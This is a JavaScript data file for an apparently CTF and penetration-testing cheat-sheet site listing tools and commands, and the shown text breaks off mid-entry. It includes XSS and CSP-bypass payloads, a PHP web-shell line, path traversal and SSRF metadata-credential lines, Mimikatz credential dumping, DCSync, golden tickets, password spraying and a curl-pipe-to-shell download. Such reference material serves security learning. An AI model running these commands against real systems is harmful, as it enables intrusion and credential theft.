// This file contains all the data for XploitBase tools and commands

const xploitBaseData = {
    categories: [
        {
            id: "web",
            name: "Web",
            icon: "fa-globe",
            tools: [                {                    name: "Burp Suite",
                    description: "A web proxy to intercept and modify HTTP requests.",
                    type: "proxy",
                    toolType: "🖥️ Software",
                    links: [
                        {
                            label: "Download",
                            url: "https://portswigger.net/burp/communitydownload",
                            type: "download"
                        },
                        {
                            label: "Documentation",
                            url: "https://portswigger.net/burp/documentation",
                            type: "docs"
                        }
                    ],                    commands: [
                        {
                            name: "Intercept ON",
                            command: "Enable Intercept",
                            description: "Enable request interception",
                            learn: {
                                title: "Request Interception",
                                details: [
                                    "Used to capture and hold HTTP/HTTPS requests before they are sent to the server",
                                    "Allows manual inspection and modification of requests",
                                    "Enable/disable using the Intercept button in the Proxy tab"
                                ]
                            }
                        },
                        {
                            name: "Send to Repeater",
                            command: "Right-click → Send to Repeater",
                            description: "Send request to repeater for manipulation",
                            learn: {
                                title: "Using Repeater",
                                details: [
                                    "Allows you to manually modify and resend requests multiple times",
                                    "Useful for testing different payloads and parameters",
                                    "Shows the full response for analysis"
                                ]
                            }
                        },
                        {
                            name: "Scan Target",
                            command: "Active Scan",
                            description: "Perform active vulnerability scan on target",
                            learn: {
                                title: "Active Scanning",
                                details: [
                                    "Automatically tests for various web vulnerabilities",
                                    "Can detect SQL injection, XSS, and other common vulnerabilities",
                                    "Available in Burp Suite Professional version",
                                    "Configure scan settings to avoid false positives"
                                ]
                            }
                        }
                    ]
                },                {
                    name: "sqlmap",
                    description: "Automated SQL injection and database takeover tool.",
                    type: "exploitation",
                    toolType: "🔧 CLI Tool",
                    links: [
                        {
                            label: "GitHub",
                            url: "https://github.com/sqlmapproject/sqlmap",
                            type: "github"
                        },
                        {
                            label: "Wiki",
                            url: "https://github.com/sqlmapproject/sqlmap/wiki",
                            type: "docs"
                        }
                    ],
                    commands: [
                        {
                            name: "List Databases",
                            command: "sqlmap -u \"http://site.com?id=1\" --dbs",
                            description: "Lists all databases",
                            learn: {
                                title: "sqlmap Database Enumeration",
                                details: [
                                    "-u specifies the URL",
                                    "--dbs tells sqlmap to enumerate databases",
                                    "Use this to confirm SQLi vulnerability and explore DB structure"
                                ]
                            }
                        },
                        {
                            name: "Full Auto Exploit",
                            command: "sqlmap -u \"...\" --batch --risk=3 --level=5",
                            description: "Full auto exploit with high risk"
                        },
                        {
                            name: "Dump Table",                            command: "sqlmap -u \"...\" -D <db> -T <table> --dump",
                            description: "Dumps table content"
                        }
                    ]
                },                {
                    name: "XSS Tools",
                    description: "Cross-Site Scripting tools and payloads.",
                    type: "exploitation",
                    toolType: "📚 Framework",
                    links: [
                        {
                            label: "XSS Payloads",
                            url: "https://github.com/payloadbox/xss-payload-list",
                            type: "github"
                        }
                    ],
                    commands: [
                        {
                            name: "Basic Alert",
                            command: "<script>alert('XSS')</script>",
                            description: "Simple XSS test payload",
                            learn: {
                                title: "XSS Testing",
                                details: [
                                    "Tests if script tags are being filtered",
                                    "Try in form fields, URL parameters, and headers",
                                    "Look for proper encoding or WAF bypasses if blocked"
                                ]
                            }
                        },
                        {
                            name: "DOM XSS",
                            command: "location.hash.substring(1)",
                            description: "Common source for DOM-based XSS"
                        },
                        {
                            name: "CSP Bypass",
                            command: "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js\"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
                            description: "Bypass Content Security Policy with AngularJS"
                        }
                    ]
                },                {
                    name: "LFI & Path Traversal",
                    description: "Tools for Local File Inclusion & Directory Traversal.",
                    type: "exploitation",
                    toolType: "📝 Steps",
                    commands: [
                        {
                            name: "Basic Traversal",
                            command: "../../../../../../etc/passwd",
                            description: "Path traversal to access /etc/passwd"
                        },
                        {
                            name: "PHP Filter Wrapper",
                            command: "php://filter/convert.base64-encode/resource=index.php",
                            description: "Read PHP source code via filter wrapper",
                            learn: {
                                title: "PHP Filter Wrapper Technique",
                                details: [
                                    "Bypasses restrictions that prevent direct file access",
                                    "Encodes the file in base64 to prevent execution",
                                    "Use base64_decode() to view the actual source code"
                                ]
                            }
                        },
                        {
                            name: "LFI to RCE (Log Poisoning)",
                            command: "<?php system($_GET['cmd']); ?>",
                            description: "Inject PHP code into logs, then include log file"
                        },
                        {
                            name: "Null Byte (PHP < 5.3.4)",
                            command: "../../../../etc/passwd%00.jpg",
                            description: "Use null byte to bypass extension filtering"
                        }
                    ]
                },                {
                    name: "SSRF",
                    description: "Server-Side Request Forgery techniques.",
                    type: "exploitation",
                    toolType: "📝 Steps",
                    commands: [
                        {
                            name: "Basic Internal Scan",
                            command: "http://localhost:8080/admin",
                            description: "Access internal services via SSRF"
                        },
                        {
                            name: "AWS Metadata",
                            command: "http://169.254.169.254/latest/meta-data/",
                            description: "Access AWS instance metadata service",
                            learn: {
                                title: "Cloud Metadata SSRF",
                                details: [
                                    "Cloud providers have metadata services at special IPs",
                                    "AWS: 169.254.169.254, Azure: 169.254.169.254, GCP: 169.254.169.254",
                                    "Can reveal access keys, user data, and instance information",
                                    "Try /iam/security-credentials/ path in AWS for access keys"
                                ]
                            }
                        },
                        {
                            name: "Bypass localhost filter",
                            command: "http://127.0.0.1\nhttp://127.1\nhttp://0\nhttp://0.0.0.0",
                            description: "Different localhost representations to bypass filters"
                        }
                    ]
                }
            ]
        },
        {
            id: "reverse",
            name: "Reverse Engineering",
            icon: "fa-undo",
            tools: [                {
                    name: "Ghidra",
                    description: "NSA's open-source reverse engineering suite.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Analyze Binary",
                            command: "Open .bin or .exe → Auto Analyze",
                            description: "Open and analyze binary files"
                        },
                        {
                            name: "View Decompiled Code",
                            command: "Use Decompiler Window to read C code",
                            description: "View C-like decompiled code"
                        },
                        {
                            name: "Disassemble Function",
                            command: "Right-click → Disassemble Function",
                            description: "View assembly code of a function"
                        }
                    ]
                },                {
                    name: "strings",
                    description: "Lists printable strings in binary files.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Find Strings",
                            command: "strings file.bin",
                            description: "Search for readable strings in binary"
                        }
                    ]
                }
            ]
        },
        {
            id: "binary",
            name: "Binary Exploitation",
            icon: "fa-microchip",
            tools: [                {
                    name: "pwndbg + gdb",
                    description: "Debugger with a useful visual interface.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Start Debug",
                            command: "gdb ./vuln",
                            description: "Start GDB with the vulnerable binary"
                        },
                        {
                            name: "Run Program",
                            command: "run",
                            description: "Execute the program being debugged"
                        },
                        {
                            name: "Set Breakpoint",                            command: "break *<address>",
                            description: "Set a breakpoint at a specific memory address"
                        },
                        {
                            name: "Examine Stack",
                            command: "x/s $esp",
                            description: "Examine memory at ESP register as a string"
                        }
                    ]
                },                {
                    name: "Buffer Overflow Tools",
                    description: "Tools and techniques for exploiting buffer overflows.",
                    toolType: "📚 Framework",
                    commands: [
                        {
                            name: "Pattern Create",
                            command: "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500",
                            description: "Create a cyclic pattern to find offset",
                            learn: {
                                title: "Buffer Overflow Pattern",
                                details: [
                                    "Creates a unique pattern to identify exact buffer offset",
                                    "After crash, use pattern_offset.rb with EIP/RIP value",
                                    "Helps calculate precise location to place shellcode"
                                ]
                            }
                        },
                        {
                            name: "Pattern Offset",
                            command: "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41376641",
                            description: "Find offset in pattern using register value"
                        },
                        {
                            name: "Check Bad Chars",
                            command: "\\x00\\x01\\x02...\\xff",
                            description: "Send all hex characters to identify bad characters"
                        },
                        {
                            name: "Find JMP ESP",
                            command: "!mona find -s \"\\xff\\xe4\" -m <module>",
                            description: "Find JMP ESP instruction (\\xff\\xe4) in module"
                        }
                    ]
                },                {
                    name: "ROP Exploitation",
                    description: "Return-Oriented Programming techniques for bypassing protections.",
                    toolType: "📝 Steps",
                    commands: [
                        {
                            name: "ROP Gadget Finder",
                            command: "ROPgadget --binary ./vulnerable_binary",
                            description: "Find usable ROP gadgets in binary",
                            learn: {
                                title: "ROP Chain Construction",
                                details: [
                                    "Bypasses DEP/NX by using existing code snippets (gadgets)",
                                    "Each gadget typically ends with a 'ret' instruction",
                                    "Chain gadgets together to create a custom execution flow",
                                    "Look for gadgets that control registers needed for syscalls"
                                ]
                            }
                        },
                        {
                            name: "ROP Chain syscall",
                            command: "pop rdi; ret\npop rsi; ret\npop rdx; ret",
                            description: "Common gadgets for loading syscall arguments"
                        },
                        {
                            name: "mprotect ROP",
                            command: "ROPgadget --binary ./target --ropchain",
                            description: "Auto-generate ROP chain to make stack executable"
                        }
                    ]
                },                {
                    name: "Format String Exploits",
                    description: "Tools for exploiting format string vulnerabilities.",
                    toolType: "📝 Steps",
                    commands: [
                        {
                            name: "Memory Read",
                            command: "%08x.%08x.%08x.%08x",
                            description: "Read values from the stack"
                        },
                        {
                            name: "Direct Parameter",
                            command: "%3$s",
                            description: "Read 3rd parameter as string using direct access",
                            learn: {
                                title: "Format String Parameter Access",
                                details: [
                                    "Access specific parameters with %n$s notation",
                                    "Use %n$p to view as pointer, %n$x as hex",
                                    "Can be used to precisely target memory locations"
                                ]
                            }
                        },
                        {
                            name: "Write Memory",
                            command: "%n",
                            description: "Write the number of bytes printed so far to memory"
                        },
                        {
                            name: "Arbitrary Write",
                            command: "%10$n",
                            description: "Write to memory at the 10th parameter"
                        }
                    ]
                }
            ]
        },
        {
            id: "crypto",
            name: "Cryptography",
            icon: "fa-key",
            tools: [                {
                    name: "CyberChef",
                    description: "Swiss army knife for crypto & encoding.",
                    toolType: "🌐 Website",
                    commands: [
                        {
                            name: "Base64 Decode",
                            command: "Use Base64 recipe",
                            description: "Decode Base64 encoded data"
                        },
                        {
                            name: "XOR Brute-force",
                            command: "Use XOR Brute Force recipe",
                            description: "Try different XOR keys to decode data"
                        },
                        {
                            name: "JWT Decode",
                            command: "Use JWT Decode recipe",
                            description: "Analyze JSON Web Tokens"
                        }
                    ]
                },                {
                    name: "Hashcat",
                    description: "Advanced password recovery tool.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Crack MD5",
                            command: "hashcat -m 0 hash.txt rockyou.txt --force",
                            description: "Crack MD5 hashes using rockyou wordlist"
                        },
                        {
                            name: "Crack SHA1",                            command: "hashcat -m 100 -a 0 hash.txt wordlist.txt",
                            description: "Crack SHA1 hashes using specified wordlist"
                        }
                    ]
                },                {
                    name: "RSA Tools",
                    description: "Tools for RSA cryptanalysis and attacks.",
                    type: "crypto",
                    toolType: "📚 Framework",
                    commands: [
                        {
                            name: "RSACTFTool",
                            command: "python3 RsaCtfTool.py --publickey ./key.pub --private",
                            description: "Attempt to recover private key from public key",
                            learn: {
                                title: "RSA Vulnerabilities",
                                details: [
                                    "Attacks common weak key generation methods",
                                    "Can factor small moduli or detect shared primes",
                                    "Useful when n is small or factorizable",
                                    "Try with --attack flag for specific attacks"
                                ]
                            }
                        },
                        {
                            name: "Common Modulus Attack",
                            command: "python3 RsaCtfTool.py --publickey ./key1.pub --publickey ./key2.pub --commonmodulus",
                            description: "Attack RSA when same modulus is used with different exponents"
                        },
                        {
                            name: "ROCA (CVE-2017-15361)",
                            command: "python3 RsaCtfTool.py --publickey ./key.pub --attack roca",
                            description: "Attack vulnerability in Infineon TPM key generation"
                        },
                        {
                            name: "Extract RSA from PEM",
                            command: "openssl rsa -in private.pem -text -noout",
                            description: "Display RSA key components from PEM file"
                        }
                    ]
                },                {
                    name: "Classic Ciphers",
                    description: "Tools for solving classic cryptographic ciphers.",
                    type: "crypto",
                    toolType: "📚 Framework",
                    commands: [
                        {
                            name: "Caesar Brute Force",
                            command: "for i in {1..25}; do echo $i: $(echo 'PBQR' | tr '[A-Z]' $(printf \"%c-%c\" $((65+$i)) $((90+$i)) | tr -d '-')); done",
                            description: "Brute force all Caesar cipher shifts",
                            learn: {
                                title: "Caesar Cipher",
                                details: [
                                    "Simple substitution cipher that shifts alphabets",
                                    "Only 25 possible shifts to try (brute-forceable)",
                                    "ROT13 is a specific Caesar cipher with 13-letter shift",
                                    "Frequency analysis can also be used to solve it"
                                ]
                            }
                        },
                        {
                            name: "Vigenère Decode",
                            command: "python3 -c \"from pycipher import Vigenere; print(Vigenere('KEY').decipher('CIPHERTEXT'))\"",
                            description: "Decode Vigenère cipher with known key"
                        },
                        {
                            name: "Frequency Analysis",
                            command: "cat ciphertext.txt | sort | uniq -c | sort -nr",
                            description: "Count character frequencies for substitution analysis"
                        }
                    ]
                },                {
                    name: "XOR Analysis",
                    description: "Tools for analyzing and breaking XOR encryption.",
                    type: "crypto",
                    toolType: "📝 Steps",
                    commands: [
                        {
                            name: "Single-byte XOR",
                            command: "for i in {1..255}; do python3 -c \"print(''.join([chr(ord(c) ^ $i) for c in 'CIPHERTEXT']))\"; done",
                            description: "Brute force single-byte XOR key",
                            learn: {
                                title: "XOR Encryption Weaknesses",
                                details: [
                                    "XOR with a repeating key is vulnerable to frequency analysis",
                                    "XOR between two messages reveals patterns when key reuse happens",
                                    "Known-plaintext allows direct key recovery via XOR operation",
                                    "Single-byte XOR can be brute-forced easily"
                                ]
                            }
                        },
                        {
                            name: "Known Plaintext XOR",
                            command: "python3 -c \"p='known'; c='cipher'.decode('hex'); key=''.join([chr(ord(p[i]) ^ ord(c[i])) for i in range(len(p))])\"",
                            description: "Recover XOR key using known plaintext"
                        },
                        {
                            name: "Multi-byte XOR Analysis",
                            command: "xortool ciphertext.bin",
                            description: "Analyze and find the XOR key length and possible keys"
                        }
                    ]
                },                {
                    name: "Block Cipher Analysis",
                    description: "Tools for analyzing block cipher modes and padding.",
                    type: "crypto",
                    toolType: "📝 Steps",
                    commands: [
                        {
                            name: "Padding Oracle Attack",
                            command: "python3 paddingoracle.py -c CIPHERTEXT -u http://example.com/verify",
                            description: "Exploit padding oracle to decrypt ciphertext",
                            learn: {
                                title: "Padding Oracle Attack",
                                details: [
                                    "Exploits error messages that reveal padding correctness",
                                    "Works against CBC mode when padding validation leaks info",
                                    "Can decrypt ciphertext without knowing the key",
                                    "Also possible to encrypt arbitrary messages"
                                ]
                            }
                        },
                        {
                            name: "AES ECB Detection",
                            command: "hexdump -C ciphertext.bin | grep --color='auto' -E '(^.{8}(\\s+\\w+){2}\\s+)\\1'",
                            description: "Detect ECB mode by finding repeated blocks"
                        },
                        {
                            name: "CBC Bit Flipping",
                            command: "# XOR the IV or previous block with (original_byte ^ desired_byte)",
                            description: "Manipulate plaintext via ciphertext bit flipping in CBC mode"
                        }
                    ]
                }
            ]
        },
        {
            id: "osint",
            name: "OSINT",
            icon: "fa-eye",
            tools: [                {
                    name: "theHarvester",
                    description: "Gathers emails, subdomains, and more.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Subdomain Search",
                            command: "theHarvester -d example.com -b google",
                            description: "Find subdomains using Google search"
                        }
                    ]
                },                {
                    name: "holehe",
                    description: "Checks if an email is used on services.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Email Check",
                            command: "holehe user@example.com",
                            description: "Check which services an email is registered with"
                        }
                    ]
                }
            ]
        },
        {
            id: "forensics",
            name: "Forensics",
            icon: "fa-search",
            tools: [                {
                    name: "Autopsy",
                    description: "Digital forensics platform for disk analysis.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Create Case",
                            command: "Open Autopsy → New Case",
                            description: "Start a new forensic investigation"
                        },
                        {
                            name: "Recover Deleted Files",
                            command: "Use File Recovery module",
                            description: "Attempt to recover deleted files from disk image"
                        }
                    ]
                },                {
                    name: "ExifTool",
                    description: "Read and write metadata in files.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Get Metadata",
                            command: "exiftool image.jpg",
                            description: "Extract all metadata from an image file"
                        },
                        {
                            name: "Remove Metadata",
                            command: "exiftool -all= image.jpg",
                            description: "Strip all metadata from an image"
                        }
                    ]
                }
            ]
        },
        {
            id: "stego",
            name: "Steganography",
            icon: "fa-image",
            tools: [                {
                    name: "Steghide",
                    description: "Hides data in various kinds of image and audio files.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Extract Data",
                            command: "steghide extract -sf file.jpg",
                            description: "Extract hidden data from an image file"
                        },
                        {
                            name: "Hide Data",
                            command: "steghide embed -cf image.jpg -ef secret.txt",
                            description: "Hide a text file inside an image"
                        }
                    ]
                },                {
                    name: "zsteg",
                    description: "Detect hidden data in PNG & BMP files.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Analyze PNG",
                            command: "zsteg image.png",
                            description: "Detect various steganography techniques in PNG"
                        },
                        {
                            name: "Extract Data",
                            command: "zsteg -E b1,rgb,lsb image.png",
                            description: "Extract data using specific parameters"
                        }
                    ]
                }
            ]
        },
        {
            id: "mobile",
            name: "Mobile",
            icon: "fa-mobile-alt",
            tools: [                {
                    name: "APKTool",
                    description: "Tool for reverse engineering Android APK files.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Decompile APK",
                            command: "apktool d application.apk",
                            description: "Decompile an APK file for analysis"
                        },
                        {
                            name: "Rebuild APK",
                            command: "apktool b application_folder -o new.apk",
                            description: "Rebuild an APK after making changes"
                        }
                    ]
                },                {
                    name: "MobSF",
                    description: "Mobile Security Framework for automated analysis.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Start Server",
                            command: "./run.sh or run.bat",
                            description: "Start the MobSF web interface"
                        },
                        {
                            name: "Upload App",
                            command: "Use web interface at 127.0.0.1:8000",
                            description: "Upload an app through web interface for analysis"
                        }
                    ]
                }
            ]
        },
        {
            id: "network",
            name: "Networking",
            icon: "fa-network-wired",
            tools: [                {
                    name: "Wireshark",
                    description: "Network protocol analyzer.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Capture Traffic",
                            command: "Select Interface → Start Capture",
                            description: "Begin capturing network packets"
                        },
                        {
                            name: "Filter HTTP",
                            command: "http",
                            description: "Display only HTTP traffic in capture"
                        },
                        {
                            name: "Follow TCP Stream",
                            command: "Right-click → Follow → TCP Stream",
                            description: "View the complete conversation in a TCP session"
                        }
                    ]
                },                {
                    name: "Nmap",
                    description: "Network exploration and security auditing.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Basic Scan",
                            command: "nmap 192.168.1.0/24",
                            description: "Scan entire subnet for hosts and common ports"
                        },
                        {
                            name: "Service Detection",
                            command: "nmap -sV target.com",
                            description: "Detect versions of services running on ports"
                        },
                        {
                            name: "Full Port Scan",
                            command: "nmap -p- target.com",
                            description: "Scan all 65535 ports on target"
                        }
                    ]
                }
            ]
        },
        {
            id: "misc",
            name: "Miscellaneous",
            icon: "fa-ellipsis-h",
            tools: [                {
                    name: "Magic",
                    description: "Swiss army knife for file analysis.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "File Type Detection",
                            command: "file unknown_file",
                            description: "Identify file type based on contents"
                        }
                    ]
                },                {
                    name: "Python One-liners",
                    description: "Useful Python commands for CTF challenges.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "HTTP Server",
                            command: "python -m http.server 8000",
                            description: "Start a simple HTTP server in current directory"
                        },
                        {
                            name: "Base64 Decode",
                            command: "python -c \"import base64; print(base64.b64decode('SGVsbG8='))\"",
                            description: "Decode a Base64 string from command line"
                        }
                    ]                }
            ]
        },
        {
            id: "system",
            name: "System Exploitation",
            icon: "fa-server",
            tools: [                {
                    name: "Metasploit Framework",
                    description: "Advanced open-source platform for developing, testing, and executing exploits.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Start Console",
                            command: "msfconsole",
                            description: "Start the Metasploit command console"
                        },
                        {
                            name: "Search Exploit",
                            command: "search type:exploit platform:windows ms17-010",
                            description: "Search for specific exploits by criteria"
                        },
                        {
                            name: "Use Module",
                            command: "use exploit/windows/smb/ms17_010_eternalblue",
                            description: "Select a specific exploit module"
                        },
                        {
                            name: "Show Options",
                            command: "show options",
                            description: "Display required and optional settings for a module"
                        }
                    ]
                },                {
                    name: "John the Ripper",
                    description: "Password cracking tool for various system passwords.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Crack Linux Shadow",
                            command: "john --format=crypt /etc/shadow",
                            description: "Attempt to crack Linux shadow password hashes"
                        },
                        {
                            name: "Crack Windows Hash",
                            command: "john --format=NT hashes.txt",
                            description: "Crack NTLM password hashes from Windows"
                        },
                        {
                            name: "Show Cracked",
                            command: "john --show hashes.txt",
                            description: "Display passwords that have been cracked"
                        }
                    ]
                },                {
                    name: "Mimikatz",
                    description: "Tool for extracting plaintext passwords, hashes, and tickets from Windows.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Dump Credentials",
                            command: "sekurlsa::logonpasswords",
                            description: "Extract plaintext passwords from Windows memory"
                        },
                        {
                            name: "Pass-the-Hash",
                            command: "sekurlsa::pth /user:admin /domain:example.com /ntlm:hash",
                            description: "Perform Pass-the-Hash attack to authenticate"
                        },
                        {
                            name: "Kerberos Tickets",
                            command: "kerberos::list",
                            description: "List available Kerberos tickets"
                        }
                    ]
                }
            ]
        },
        {
            id: "realworld",
            name: "Real World Scenarios",
            icon: "fa-building",
            tools: [                {
                    name: "Empire",
                    description: "PowerShell post-exploitation framework.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Start Server",
                            command: "./empire",
                            description: "Launch the Empire server interface"
                        },
                        {
                            name: "Generate Stager",
                            command: "usestager windows/launcher_bat",
                            description: "Generate a Windows batch stager for initial access"
                        },
                        {
                            name: "List Agents",
                            command: "agents",
                            description: "List all connected agents/implants"
                        }
                    ]
                },                {
                    name: "CrackMapExec",
                    description: "Swiss Army Knife for Windows/Active Directory environments.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "SMB Scan",
                            command: "crackmapexec smb 192.168.1.0/24",
                            description: "Scan network for SMB services and information"
                        },
                        {
                            name: "Password Spray",
                            command: "crackmapexec smb 192.168.1.0/24 -u userlist.txt -p 'Password123!'",
                            description: "Attempt to authenticate using common passwords"
                        },
                        {
                            name: "Execute Commands",
                            command: "crackmapexec smb 192.168.1.0/24 -u admin -p password -x 'whoami'",
                            description: "Execute commands on compromised systems"
                        }
                    ]
                },                {
                    name: "Covenant",
                    description: ".NET command and control framework.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Start C2",
                            command: "dotnet run --project /opt/Covenant/Covenant",
                            description: "Start the Covenant C2 framework"
                        },
                        {
                            name: "Generate Grunt",
                            command: "Use Launcher → PowerShell",
                            description: "Create PowerShell launcher for initial access"
                        },
                        {
                            name: "Task Grunt",
                            command: "Use Interact → Task",
                            description: "Assign tasks to compromised hosts"
                        }
                    ]
                }
            ]
        },
        {
            id: "privesc",
            name: "Privilege Escalation",
            icon: "fa-arrow-up",
            tools: [                {
                    name: "LinPEAS",
                    description: "Linux Privilege Escalation Awesome Script.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Run Script",
                            command: "./linpeas.sh",
                            description: "Execute comprehensive Linux privilege escalation scan"
                        },
                        {
                            name: "Run Without Saving",
                            command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                            description: "Download and run without saving to disk"
                        },
                        {
                            name: "Output to File",
                            command: "./linpeas.sh > linpeas_output.txt",
                            description: "Save scan results to a file for review"
                        }
                    ]
                },                {
                    name: "WinPEAS",
                    description: "Windows Privilege Escalation Awesome Script.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Run Batch Version",
                            command: "winpeas.bat",
                            description: "Run batch version of Windows privilege escalation scanner"
                        },
                        {
                            name: "Run .NET Version",
                            command: "winpeas.exe",
                            description: "Run .NET executable version with more capabilities"
                        },
                        {
                            name: "Check Credentials",
                            command: "winpeas.exe windowscreds",
                            description: "Scan specifically for stored credentials"
                        }
                    ]
                },                {
                    name: "GTFOBins",
                    description: "Unix binaries that can be used to bypass local security restrictions.",
                    toolType: "🌐 Website",
                    commands: [
                        {
                            name: "Sudo Rights",
                            command: "sudo -l",
                            description: "List programs user can run with sudo privileges"
                        },
                        {
                            name: "Find in GTFOBins",
                            command: "Visit https://gtfobins.github.io/",
                            description: "Look up binary in GTFOBins to find escape techniques"
                        }
                    ]
                },                {
                    name: "LOLBAS",
                    description: "Living Off The Land Binaries, Scripts and Libraries for Windows.",
                    toolType: "🌐 Website",
                    commands: [
                        {
                            name: "Find in LOLBAS",
                            command: "Visit https://lolbas-project.github.io/",
                            description: "Look up Windows binary for potential misuse"
                        }
                    ]
                }
            ]
        },
        {
            id: "malware",
            name: "Malware Analysis",
            icon: "fa-bug",
            tools: [                {
                    name: "CAPA",
                    description: "Identifies capabilities in executable files.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Analyze File",
                            command: "capa malware.exe",
                            description: "Identify capabilities in a Windows executable"
                        },
                        {
                            name: "Verbose Output",
                            command: "capa -v malware.exe",
                            description: "Detailed analysis with more information"
                        },
                        {
                            name: "JSON Output",
                            command: "capa -j malware.exe > capabilities.json",
                            description: "Export results in JSON format"
                        }
                    ]
                },                {
                    name: "PEStudio",
                    description: "Scans Windows executables for suspicious indicators.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Open File",
                            command: "File → Open → malware.exe",
                            description: "Load a Windows executable for analysis"
                        },
                        {
                            name: "View Indicators",
                            command: "Check 'Indicators' tab",
                            description: "Review suspicious elements found in the file"
                        },
                        {
                            name: "Export Report",
                            command: "File → Save Report",
                            description: "Generate and save analysis report"
                        }
                    ]
                },                {
                    name: "REMnux",
                    description: "Linux toolkit for reverse-engineering and analyzing malware.",
                    toolType: "📚 Framework",
                    commands: [
                        {
                            name: "Static Analysis",
                            command: "pescan malware.exe",
                            description: "Quick static analysis of a PE executable"
                        },
                        {
                            name: "Extract Strings",
                            command: "strings -a -t x malware.exe",
                            description: "Extract all strings with their offset in hex"
                        },
                        {
                            name: "Analyze PDF",
                            command: "pdfid suspicious.pdf",
                            description: "Identify potentially malicious elements in a PDF"
                        }
                    ]
                }
            ]
        },
        {
            id: "idor",
            name: "IDOR Vulnerabilities",
            icon: "fa-exchange-alt",
            tools: [                {
                    name: "Autorize",
                    description: "Burp Suite extension for authorization testing.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Configure Tool",
                            command: "Extender → BApp Store → Autorize → Install",
                            description: "Install and enable the Autorize extension"
                        },
                        {
                            name: "Set Cookies",
                            command: "Configure authorized/unauthorized session cookies",
                            description: "Setup different user privilege levels for testing"
                        },
                        {
                            name: "Identify IDORs",
                            command: "Look for green (allowed) requests that should be red (blocked)",
                            description: "Identify authorization bypass vulnerabilities"
                        }
                    ]
                },                {
                    name: "Param Miner",
                    description: "Identifies hidden or unlinked parameters.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Install Extension",
                            command: "Extender → BApp Store → Param Miner → Install",
                            description: "Add Param Miner to Burp Suite"
                        },
                        {
                            name: "Guess Parameters",
                            command: "Right-click → Extensions → Param Miner → Guess params",
                            description: "Discover hidden parameters that might be vulnerable"
                        }
                    ]
                },                {
                    name: "Fiddler",
                    description: "Web debugging proxy for manipulating HTTP requests.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Capture Traffic",
                            command: "File → Capture Traffic",
                            description: "Begin capturing HTTP/HTTPS traffic"
                        },
                        {
                            name: "Modify Request",
                            command: "Select request → Right-click → Edit Request",
                            description: "Change parameters to test for IDOR vulnerabilities"
                        },
                        {
                            name: "Auto Responder",
                            command: "Auto Responder tab → Add Rule",
                            description: "Set up automatic response manipulation"
                        }
                    ]
                }
            ]
        },
        {
            id: "activedir",
            name: "Active Directory",
            icon: "fa-sitemap",
            tools: [                {
                    name: "BloodHound",
                    description: "Reveals the hidden and often unintended relationships within an Active Directory environment.",
                    toolType: "🖥️ Software",
                    commands: [
                        {
                            name: "Collect Data",
                            command: ".\\SharpHound.exe -c All",
                            description: "Collect all data from domain for analysis"
                        },
                        {
                            name: "Import Data",
                            command: "Upload ZIP to BloodHound interface",
                            description: "Import collected data into BloodHound for analysis"
                        },
                        {
                            name: "Find Path to DA",
                            command: "Query: MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.name='User' AND m.name='Domain Admins'",
                            description: "Find shortest path to Domain Admin privileges"
                        }
                    ]
                },                {
                    name: "Mimikatz",
                    description: "Tool for extracting credentials from Windows memory.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "DCSync Attack",
                            command: "lsadump::dcsync /domain:corp.local /user:Administrator",
                            description: "Replicate domain controller data to extract password hashes"
                        },
                        {
                            name: "Golden Ticket",
                            command: "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /user:fakeadmin /ptt",
                            description: "Create and inject a Golden Ticket for persistence"
                        },
                        {
                            name: "Silver Ticket",
                            command: "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:HTTP /rc4:hash /user:fakeadmin /ptt",
                            description: "Create a Silver Ticket for specific service access"
                        }
                    ]
                },                {
                    name: "PowerView",
                    description: "PowerShell tool for Active Directory enumeration and exploitation.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Get Domain Users",
                            command: "Get-DomainUser",
                            description: "List all users in the domain"
                        },
                        {
                            name: "Find Admins",
                            command: "Get-DomainGroupMember 'Domain Admins'",
                            description: "List all members of the Domain Admins group"
                        },
                        {
                            name: "Find Kerberoastable",
                            command: "Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname",
